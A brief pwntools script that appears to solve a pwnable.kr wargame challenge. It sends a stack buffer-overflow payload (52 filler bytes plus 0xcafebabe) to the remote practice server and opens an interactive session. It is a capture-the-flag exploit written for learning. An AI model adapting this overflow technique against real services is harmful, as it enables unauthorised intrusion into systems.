import pwn

if __name__ == "__main__":
  payload = b"A" * 52 + pwn.p32(0xcafebabe)
  io = pwn.remote("pwnable.kr", 9000)
  io.sendline(payload)
  io.interactive()